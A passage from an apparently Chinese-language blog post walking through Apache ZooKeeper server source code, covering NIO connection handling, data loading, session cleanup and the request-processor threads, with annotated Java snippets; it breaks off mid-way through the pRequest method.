<h3 id="NIOServerCnxnFactory-的-run-方法"><a href="#NIOServerCnxnFactory-的-run-方法" class="headerlink" title="NIOServerCnxnFactory 的 run 方法"></a>NIOServerCnxnFactory 的 run 方法</h3><p>run 方法来指定线程启动后的操作信息.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!ss.socket().isClosed()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                selector.select(<span class="number">1000</span>);</span><br><span class="line">                Set&lt;SelectionKey&gt; selected;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                    selected = selector.selectedKeys();</span><br><span class="line">                &#125;</span><br><span class="line">                ArrayList&lt;SelectionKey&gt; selectedList = <span class="keyword">new</span> ArrayList&lt;SelectionKey&gt;(</span><br><span class="line">                        selected);</span><br><span class="line">                Collections.shuffle(selectedList);</span><br><span class="line">                <span class="keyword">for</span> (SelectionKey k : selectedList) &#123;</span><br><span class="line">                    <span class="comment">// 接收连接请求</span></span><br><span class="line">                    <span class="keyword">if</span> ((k.readyOps() &amp; SelectionKey.OP_ACCEPT) != <span class="number">0</span>) &#123;</span><br><span class="line">                        SocketChannel sc = ((ServerSocketChannel) k</span><br><span class="line">                                .channel()).accept();</span><br><span class="line">                        <span class="comment">//获取serversocker的连接数</span></span><br><span class="line">                        InetAddress ia = sc.socket().getInetAddress();</span><br><span class="line">                        <span class="keyword">int</span> cnxncount = getClientCnxnCount(ia);</span><br><span class="line">                        <span class="comment">//判断是否超过配置最大连接数</span></span><br><span class="line">                        <span class="keyword">if</span> (maxClientCnxns &gt; <span class="number">0</span> &amp;&amp; cnxncount &gt;= maxClientCnxns)&#123;</span><br><span class="line">                            LOG.warn(<span class="string">"Too many connections from "</span> + ia</span><br><span class="line">                                     + <span class="string">" - max is "</span> + maxClientCnxns );</span><br><span class="line">                            sc.close();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            LOG.info(<span class="string">"Accepted socket connection from "</span></span><br><span class="line">                                     + sc.socket().getRemoteSocketAddress());</span><br><span class="line">                            sc.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                            SelectionKey sk = sc.register(selector,</span><br><span class="line">                                    SelectionKey.OP_READ);</span><br><span class="line">                            <span class="comment">//获取连接信息，并添加到set中</span></span><br><span class="line">                            NIOServerCnxn cnxn = createConnection(sc, sk);</span><br><span class="line">                            sk.attach(cnxn);</span><br><span class="line">                            addCnxn(cnxn);</span><br><span class="line">                        &#125;</span><br><span class="line">                      <span class="comment">// 获取读写请求</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((k.readyOps() &amp; (SelectionKey.OP_READ | SelectionKey.OP_WRITE)) != <span class="number">0</span>) &#123;</span><br><span class="line">                        NIOServerCnxn c = (NIOServerCnxn) k.attachment();</span><br><span class="line">                        <span class="comment">//处理读写IO请求</span></span><br><span class="line">                        c.doIO(k);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                            LOG.debug(<span class="string">"Unexpected ops in select "</span></span><br><span class="line">                                      + k.readyOps());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                selected.clear();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Ignoring unexpected runtime exception"</span>, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Ignoring exception"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closeAll();</span><br><span class="line">        LOG.info(<span class="string">"NIOServerCnxn factory exited run method"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>主要来看 doIO 方法中请求的处理。所有的请求处理都在这个线程里处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handles read/write IO on connection.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">doIO</span><span class="params">(SelectionKey k)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// socket已关闭</span></span><br><span class="line">            <span class="keyword">if</span> (isSocketOpen() == <span class="keyword">false</span>) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"trying to do i/o on a null socket for session:0x"</span></span><br><span class="line">                         + Long.toHexString(sessionId));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//可读</span></span><br><span class="line">            <span class="keyword">if</span> (k.isReadable()) &#123;</span><br><span class="line">                <span class="comment">//从Buffer读取数据</span></span><br><span class="line">                <span class="keyword">int</span> rc = sock.read(incomingBuffer);</span><br><span class="line">                <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> EndOfStreamException(</span><br><span class="line">                            <span class="string">"Unable to read additional data from client sessionid 0x"</span></span><br><span class="line">                            + Long.toHexString(sessionId)</span><br><span class="line">                            + <span class="string">", likely client has closed socket"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断Buffer中元素数量(limit-position)</span></span><br><span class="line">                <span class="keyword">if</span> (incomingBuffer.remaining() == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">boolean</span> isPayload;</span><br><span class="line">                    <span class="keyword">if</span> (incomingBuffer == lenBuffer) &#123; <span class="comment">// start of next request</span></span><br><span class="line">                        <span class="comment">//移动Buffer position和limit的位置,开始读取新加入缓存区的数据</span></span><br><span class="line">                        incomingBuffer.flip();</span><br><span class="line">                        isPayload = readLength(k);</span><br><span class="line">                        incomingBuffer.clear();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// continuation</span></span><br><span class="line">                        isPayload = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//非四字命令的情况</span></span><br><span class="line">                    <span class="keyword">if</span> (isPayload) &#123; <span class="comment">// not the case for 4letterword</span></span><br><span class="line">                        readPayload();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// four letter words take care</span></span><br><span class="line">                        <span class="comment">// need not do anything else</span></span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//可写</span></span><br><span class="line">            <span class="keyword">if</span> (k.isWritable()) &#123;</span><br><span class="line">                <span class="comment">// ZooLog.logTraceMessage(LOG,</span></span><br><span class="line">                <span class="comment">// ZooLog.CLIENT_DATA_PACKET_TRACE_MASK</span></span><br><span class="line">                <span class="comment">// "outgoingBuffers.size() = " +</span></span><br><span class="line">                <span class="comment">// outgoingBuffers.size());</span></span><br><span class="line">                <span class="keyword">if</span> (outgoingBuffers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// ZooLog.logTraceMessage(LOG,</span></span><br><span class="line">                    <span class="comment">// ZooLog.CLIENT_DATA_PACKET_TRACE_MASK,</span></span><br><span class="line">                    <span class="comment">// "sk " + k + " is valid: " +</span></span><br><span class="line">                    <span class="comment">// k.isValid());</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * This is going to reset the buffer position to 0 and the</span></span><br><span class="line"><span class="comment">                     * limit to the size of the buffer, so that we can fill it</span></span><br><span class="line"><span class="comment">                     * with data from the non-direct buffers that we need to</span></span><br><span class="line"><span class="comment">                     * send.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    ByteBuffer directBuffer = factory.directBuffer;</span><br><span class="line">                    directBuffer.clear();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (ByteBuffer b : outgoingBuffers) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (directBuffer.remaining() &lt; b.remaining()) &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             * When we call put later, if the directBuffer is to</span></span><br><span class="line"><span class="comment">                             * small to hold everything, nothing will be copied,</span></span><br><span class="line"><span class="comment">                             * so we've got to slice the buffer if it's too big.</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            b = (ByteBuffer) b.slice().limit(</span><br><span class="line">                                    directBuffer.remaining());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * put() is going to modify the positions of both</span></span><br><span class="line"><span class="comment">                         * buffers, put we don't want to change the position of</span></span><br><span class="line"><span class="comment">                         * the source buffers (we'll do that after the send, if</span></span><br><span class="line"><span class="comment">                         * needed), so we save and reset the position after the</span></span><br><span class="line"><span class="comment">                         * copy</span></span><br><span class="line"><span class="comment">                         * 修改buffer的读取位置</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">int</span> p = b.position();</span><br><span class="line">                        directBuffer.put(b);</span><br><span class="line">                        b.position(p);</span><br><span class="line">                        <span class="keyword">if</span> (directBuffer.remaining() == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Do the flip: limit becomes position, position gets set to</span></span><br><span class="line"><span class="comment">                     * 0. This sets us up for the write.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    directBuffer.flip();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> sent = sock.write(directBuffer);</span><br><span class="line">                    ByteBuffer bb;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Remove the buffers that we have sent</span></span><br><span class="line">                    <span class="keyword">while</span> (outgoingBuffers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        bb = outgoingBuffers.peek();</span><br><span class="line">                        <span class="keyword">if</span> (bb == ServerCnxnFactory.closeConn) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> CloseRequestException(<span class="string">"close requested"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">int</span> left = bb.remaining() - sent;</span><br><span class="line">                        <span class="keyword">if</span> (left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             * We only partially sent this buffer, so we update</span></span><br><span class="line"><span class="comment">                             * the position and exit the loop.</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            bb.position(bb.position() + sent);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//更新发送数据包数量</span></span><br><span class="line">                        packetSent();</span><br><span class="line">                        <span class="comment">/* We've sent the whole buffer, so drop the buffer */</span></span><br><span class="line">                        sent -= bb.remaining();</span><br><span class="line">                        outgoingBuffers.remove();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// ZooLog.logTraceMessage(LOG,</span></span><br><span class="line">                    <span class="comment">// ZooLog.CLIENT_DATA_PACKET_TRACE_MASK, "after send,</span></span><br><span class="line">                    <span class="comment">// outgoingBuffers.size() = " + outgoingBuffers.size());</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>.factory)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (outgoingBuffers.size() == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!initialized</span><br><span class="line">                                &amp;&amp; (sk.interestOps() &amp; SelectionKey.OP_READ) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> CloseRequestException(<span class="string">"responded to info probe"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        sk.interestOps(sk.interestOps()</span><br><span class="line">                                &amp; (~SelectionKey.OP_WRITE));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        sk.interestOps(sk.interestOps()</span><br><span class="line">                                | SelectionKey.OP_WRITE);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CancelledKeyException e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"CancelledKeyException causing close of session 0x"</span></span><br><span class="line">                     + Long.toHexString(sessionId));</span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">"CancelledKeyException stack trace"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CloseRequestException e) &#123;</span><br><span class="line">            <span class="comment">// expecting close to log session closure</span></span><br><span class="line">            close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EndOfStreamException e) &#123;</span><br><span class="line">            LOG.warn(e.getMessage());</span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">"EndOfStreamException stack trace"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// expecting close to log session closure</span></span><br><span class="line">            close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Exception causing close of session 0x"</span></span><br><span class="line">                     + Long.toHexString(sessionId) + <span class="string">": "</span> + e.getMessage());</span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                LOG.debug(<span class="string">"IOException stack trace"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>主要是 JDK NIO 的相关 API 实现,比较麻烦一些,这里不做详细描述解释。几乎所有的请求处理都在这个方法处理的，这里没有过多深入。还包含 jute 反序列化、Request、RequestHeader、ReplyHeader 接收和相应请求的细节等在这里不做详细的说明.</p>
<p>启动 server 后下面看 ZooKeeperServer 的 startdata 的方法实现。</p>
<h2 id="ZooKeeperServer-的-startdata-实现"><a href="#ZooKeeperServer-的-startdata-实现" class="headerlink" title="ZooKeeperServer 的 startdata 实现"></a>ZooKeeperServer 的 startdata 实现</h2><p>startdata 加载节点树、日志信息到内存中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startdata</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//check to see if zkDb is not null</span></span><br><span class="line">        <span class="keyword">if</span> (zkDb == <span class="keyword">null</span>) &#123;</span><br><span class="line">            zkDb = <span class="keyword">new</span> ZKDatabase(<span class="keyword">this</span>.txnLogFactory);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!zkDb.isInitialized()) &#123;</span><br><span class="line">            loadData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  Restore sessions and data</span></span><br><span class="line"><span class="comment">    * 重新载入session和数据入内存</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadData</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * When a new leader starts executing Leader#lead, it</span></span><br><span class="line"><span class="comment">        * invokes this method. The database, however, has been</span></span><br><span class="line"><span class="comment">        * initialized before running leader election so that</span></span><br><span class="line"><span class="comment">        * the server could pick its zxid for its initial vote.</span></span><br><span class="line"><span class="comment">        * It does it by invoking QuorumPeer#getLastLoggedZxid.</span></span><br><span class="line"><span class="comment">        * Consequently, we don't need to initialize it once more</span></span><br><span class="line"><span class="comment">        * and avoid the penalty of loading it a second time. Not</span></span><br><span class="line"><span class="comment">        * reloading it is particularly important for applications</span></span><br><span class="line"><span class="comment">        * that host a large database.</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * The following if block checks whether the database has</span></span><br><span class="line"><span class="comment">        * been initialized or not. Note that this method is</span></span><br><span class="line"><span class="comment">        * invoked by at least one other method:</span></span><br><span class="line"><span class="comment">        * ZooKeeperServer#startdata.</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * See ZOOKEEPER-1642 for more detail.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">if</span>(zkDb.isInitialized())&#123;</span><br><span class="line">           setZxid(zkDb.getDataTreeLastProcessedZxid());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           setZxid(zkDb.loadDataBase());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//清空超时的session信息,遍历删除对应的节点</span></span><br><span class="line">       LinkedList&lt;Long&gt; deadSessions = <span class="keyword">new</span> LinkedList&lt;Long&gt;();</span><br><span class="line">       <span class="keyword">for</span> (Long session : zkDb.getSessions()) &#123;</span><br><span class="line">           <span class="keyword">if</span> (zkDb.getSessionWithTimeOuts().get(session) == <span class="keyword">null</span>) &#123;</span><br><span class="line">               deadSessions.add(session);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//设置状态为已初始化</span></span><br><span class="line">       zkDb.setDataTreeInit(<span class="keyword">true</span>);</span><br><span class="line">       <span class="comment">//删除过期session节点信息</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">long</span> session : deadSessions) &#123;</span><br><span class="line">           <span class="comment">// <span class="doctag">XXX:</span> Is lastProcessedZxid really the best thing to use?</span></span><br><span class="line">           killSession(session, zkDb.getDataTreeLastProcessedZxid());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>通过 volatile 来保证 db 初始化状态的可见性，保证 db 只能够初始化一次。循环遍历 session 超时的节点并删除节点。源码中有一段注释信息,Leader 调用 lead 方法的时候会调用该方法，但是 db 在选主之前已经初始化,所以 server 在第一次投票的时候不能用它自己的 zxid 参与投票。具体细节在集群启动的时候在深究。</p>
<h2 id="ZooKeeperServer-的-startup-实现"><a href="#ZooKeeperServer-的-startup-实现" class="headerlink" title="ZooKeeperServer 的 startup 实现"></a>ZooKeeperServer 的 startup 实现</h2><p>一个同步方法,创建 session 跟踪线程清理过期 session、注册 JMX。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建session跟踪</span></span><br><span class="line">        <span class="keyword">if</span> (sessionTracker == <span class="keyword">null</span>) &#123;</span><br><span class="line">            createSessionTracker();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//启动session跟踪线程</span></span><br><span class="line">        startSessionTracker();</span><br><span class="line">        <span class="comment">//启动请求处理线程</span></span><br><span class="line">        setupRequestProcessors();</span><br><span class="line">        <span class="comment">//注册JMX</span></span><br><span class="line">        registerJMX();</span><br><span class="line">        <span class="comment">//设置server为运行中状态</span></span><br><span class="line">        setState(State.RUNNING);</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>主要看请求处理的信息.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupRequestProcessors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RequestProcessor finalProcessor = <span class="keyword">new</span> FinalRequestProcessor(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//同步请求处理线程</span></span><br><span class="line">        RequestProcessor syncProcessor = <span class="keyword">new</span> SyncRequestProcessor(<span class="keyword">this</span>,</span><br><span class="line">                finalProcessor);</span><br><span class="line">        <span class="comment">//启动同步请求线程</span></span><br><span class="line">        ((SyncRequestProcessor)syncProcessor).start();</span><br><span class="line">        firstProcessor = <span class="keyword">new</span> PrepRequestProcessor(<span class="keyword">this</span>, syncProcessor);</span><br><span class="line">        <span class="comment">//启动预请求线程</span></span><br><span class="line">        ((PrepRequestProcessor)firstProcessor).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>下面看一下两个线程的 run 方法的处理逻辑.</p>
<h3 id="SyncRequestProcessor-的-run-方法"><a href="#SyncRequestProcessor-的-run-方法" class="headerlink" title="SyncRequestProcessor 的 run 方法"></a>SyncRequestProcessor 的 run 方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">int</span> logCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// we do this in an attempt to ensure that not all of the servers</span></span><br><span class="line">           <span class="comment">// in the ensemble take a snapshot at the same time</span></span><br><span class="line">           setRandRoll(r.nextInt(snapCount/<span class="number">2</span>));</span><br><span class="line">           <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">               Request si = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">if</span> (toFlush.isEmpty()) &#123;</span><br><span class="line">                   si = queuedRequests.take();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   si = queuedRequests.poll();</span><br><span class="line">                   <span class="keyword">if</span> (si == <span class="keyword">null</span>) &#123;</span><br><span class="line">                       flush(toFlush);</span><br><span class="line">                       <span class="keyword">continue</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (si == requestOfDeath) &#123;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (si != <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="comment">// track the number of records written to the log</span></span><br><span class="line">                   <span class="keyword">if</span> (zks.getZKDatabase().append(si)) &#123;</span><br><span class="line">                       logCount++;</span><br><span class="line">                       <span class="keyword">if</span> (logCount &gt; (snapCount / <span class="number">2</span> + randRoll)) &#123;</span><br><span class="line">                           setRandRoll(r.nextInt(snapCount/<span class="number">2</span>));</span><br><span class="line">                           <span class="comment">// roll the log</span></span><br><span class="line">                           zks.getZKDatabase().rollLog();</span><br><span class="line">                           <span class="comment">// take a snapshot</span></span><br><span class="line">                           <span class="keyword">if</span> (snapInProcess != <span class="keyword">null</span> &amp;&amp; snapInProcess.isAlive()) &#123;</span><br><span class="line">                               LOG.warn(<span class="string">"Too busy to snap, skipping"</span>);</span><br><span class="line">                           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                               snapInProcess = <span class="keyword">new</span> ZooKeeperThread(<span class="string">"Snapshot Thread"</span>) &#123;</span><br><span class="line">                                       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                           <span class="keyword">try</span> &#123;</span><br><span class="line">                                               <span class="comment">//将数据日志写到磁盘</span></span><br><span class="line">                                               zks.takeSnapshot();</span><br><span class="line">                                           &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                                               LOG.warn(<span class="string">"Unexpected exception"</span>, e);</span><br><span class="line">                                           &#125;</span><br><span class="line">                                       &#125;</span><br><span class="line">                                   &#125;;</span><br><span class="line">                               snapInProcess.start();</span><br><span class="line">                           &#125;</span><br><span class="line">                           logCount = <span class="number">0</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (toFlush.isEmpty()) &#123;</span><br><span class="line">                       <span class="comment">// optimization for read heavy workloads</span></span><br><span class="line">                       <span class="comment">// iff this is a read, and there are no pending</span></span><br><span class="line">                       <span class="comment">// flushes (writes), then just pass this to the next</span></span><br><span class="line">                       <span class="comment">// processor</span></span><br><span class="line">                       <span class="keyword">if</span> (nextProcessor != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                           nextProcessor.processRequest(si);</span><br><span class="line">                           <span class="keyword">if</span> (nextProcessor <span class="keyword">instanceof</span> Flushable) &#123;</span><br><span class="line">                               ((Flushable)nextProcessor).flush();</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">continue</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   toFlush.add(si);</span><br><span class="line">                   <span class="keyword">if</span> (toFlush.size() &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">                       flush(toFlush);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">           handleException(<span class="keyword">this</span>.getName(), t);</span><br><span class="line">           running = <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       LOG.info(<span class="string">"SyncRequestProcessor exited!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这个线程的主要任务就是将日志信息写到磁盘中。</p>
<h3 id="PrepRequestProcessor-的-run-方法"><a href="#PrepRequestProcessor-的-run-方法" class="headerlink" title="PrepRequestProcessor 的 run 方法"></a>PrepRequestProcessor 的 run 方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">               <span class="comment">//获取请求的信息</span></span><br><span class="line">               Request request = submittedRequests.take();</span><br><span class="line">               <span class="keyword">long</span> traceMask = ZooTrace.CLIENT_REQUEST_TRACE_MASK;</span><br><span class="line">               <span class="keyword">if</span> (request.type == OpCode.ping) &#123;</span><br><span class="line">                   traceMask = ZooTrace.CLIENT_PING_TRACE_MASK;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (LOG.isTraceEnabled()) &#123;</span><br><span class="line">                   ZooTrace.logRequest(LOG, traceMask, <span class="string">'P'</span>, request, <span class="string">""</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (Request.requestOfDeath == request) &#123;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//处理请求</span></span><br><span class="line">               pRequest(request);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (RequestProcessorException e) &#123;</span><br><span class="line">           <span class="keyword">if</span> (e.getCause() <span class="keyword">instanceof</span> XidRolloverException) &#123;</span><br><span class="line">               LOG.info(e.getCause().getMessage());</span><br><span class="line">           &#125;</span><br><span class="line">           handleException(<span class="keyword">this</span>.getName(), e);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           handleException(<span class="keyword">this</span>.getName(), e);</span><br><span class="line">       &#125;</span><br><span class="line">       LOG.info(<span class="string">"PrepRequestProcessor exited loop!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>下面看处理请求的方法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">pRequest</span><span class="params">(Request request)</span> <span class="keyword">throws</span> RequestProcessorException </span>&#123;</span><br><span class="line">       <span class="comment">// LOG.info("Prep&gt;&gt;&gt; cxid = " + request.cxid + " type = " +</span></span><br><span class="line">       <span class="comment">// request.type + " id = 0x" + Long.toHexString(request.sessionId));</span></span><br><span class="line">       request.hdr = <span class="keyword">null</span>;</span><br><span class="line">       request.txn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">switch</span> (request.type) &#123;</span><br><span class="line">               <span class="keyword">case</span> OpCode.create:</span><br><span class="line">               CreateRequest createRequest = <span class="keyword">new</span> CreateRequest();</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, createRequest, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> OpCode.delete:</span><br><span class="line">               DeleteRequest deleteRequest = <span class="keyword">new</span> DeleteRequest();</span><br><span class="line">               pRequest2Txn(request.type, zks.getNextZxid(), request, deleteRequest, <span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> OpCode.setData:</span><br><span class="line">               SetDataRequest setDataRequest = <span class="keyword">new</span> 